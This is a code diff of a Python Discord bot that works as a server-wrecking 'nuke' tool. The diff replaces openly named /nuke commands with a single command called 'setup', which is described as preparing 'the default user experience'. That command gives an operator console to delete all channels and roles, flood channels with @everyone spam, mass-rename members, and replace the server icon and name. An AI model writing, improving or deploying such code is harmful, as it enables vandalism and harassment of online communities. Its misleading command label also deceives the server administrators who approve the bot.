@@ -4,83 +4,77 @@ import requests
 
 TOKEN = 'YOUR_TOKEN_HERE'
 
-nickName = "Nickname"
-image_url = "https://cdn.wallpapersafari.com/61/15/RQbVOd.jpg"
-serverName = "Server Name"
-channelName = 'Channel Name'
-message =  "@everyone"
-
-
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(intents=intents)
+
+class colors:
+  GREEN = '\x1b[32m'
+  ENDC = '\033[0m'
+  BOLD = '\033[1m'
 
 @bot.event
 async def on_ready():
   print(f'Logged in as {bot.user}')
-  print("/nuke - Destroys the server\n/nicknuke - Nicks everyone a nickname of your choosing\n/removeall - Deletes every channel")
 
-@bot.slash_command(name="nuke", description='Nukes the server')
-async def nuke(ctx):
-  for member in ctx.guild.members:
-    print(member)
-    try:
-      await member.edit(nick=nickName)
-    except:
-      print("Failed nickname")
 
-    for role in ctx.guild.roles:
-      try:
-        await role.delete()
-      except:
-        print("Failed role")
-  
-  try:
-    await ctx.guild.edit(name=serverName)
-
-    response = requests.get(image_url)
-    image_data = response.content
-    await ctx.guild.edit(icon=image_data)
-  except:
-    print("Failed edit")
-  
-  print("Beginning Nuke")
-  for channel in ctx.guild.channels:
-      try:
-        await channel.delete()
-      except:
-        print("Failed delete")
-
+@bot.slash_command(name="setup", description='Prepares the bot with the default user experience')
+async def setup(ctx):
+  print("Commands: \nremoveall - removes all channels and replaces them\nspam - sends a message with @everyone appended \nnick - nicks all users with an input \nicon - replaces the icon and name of the server \nrole - removes all available roles")
   while True:
-    await ctx.guild.create_text_channel(channelName)
-    for channel in ctx.guild.channels:
-      try:
-        await channel.send(message)
-      except:
-        print("Failed send")
-        
+    command = input(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > ")
+    
+    
+    if (command == "removeall"):
+      channelName = input("  Channel Name: ")
+      for channel in ctx.guild.channels:
+        await channel.delete()
 
-@bot.slash_command(name="nicknuke", description='Nicknames everyone on the server')
-async def nicknuke(ctx):
-  for member in ctx.guild.members:
-    print(member)
-    try:
-      await member.edit(nick=nickName)
-    except:
-      print("Failed nickname")
-
-
-@bot.slash_command(name="removeall", description='Removes all channels and roles')
-async def remove(ctx):
-  for channel in ctx.guild.channels:
-    await channel.delete()
-
-  for role in ctx.guild.roles:
-      try:
-        await role.delete()
-      except:
-        print("Failed role")
+      for lp in range(100):
+        try:
+          await ctx.guild.create_text_channel(channelName)
+        except:
+          if not (channelName == " "):
+            print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Create")
 
     
+    if (command == "spam"):
+      message = input(  "Message: ")
+      spamAmountString = input("  Messages per Channel: ")
+      spamAmount = int(spamAmountString)
+      for lp in range(spamAmount):
+        for channel in ctx.guild.channels:
+          try:
+            await channel.send(message + "@everyone")
+          except:
+            print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Send")
+
+    if (command == "icon"):
+      icon = input("  Icon Link: ") # https://townsquare.media/site/40/files/2017/03/Dog-.jpg?w=1200&h=0&zc=1&s=0&a=t&q=89
+      name = input("  New Name: ")
+      response = requests.get(icon)
+      image_data = response.content
+      try:
+        await ctx.guild.edit(icon=image_data)
+        await ctx.guild.edit(name=name)
+      except:
+        print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed Edit")
+
+    if (command == "nick"):
+      nickName = input(" New Nickname: ")
+      for member in ctx.guild.members:
+        try:
+          await member.edit(nick=nickName)
+        except:
+          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Failed nickname")
+
+    if (command == "role"):
+      for role in ctx.guild.roles:  
+        try:  
+          await role.delete()
+          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Deleted {role.name}")
+        except:
+          print(f"{colors.BOLD}{colors.GREEN}{ctx.guild.id}{colors.ENDC} > Cannot Delete {role.name}")
+
 try:
   bot.run(TOKEN)
 except:
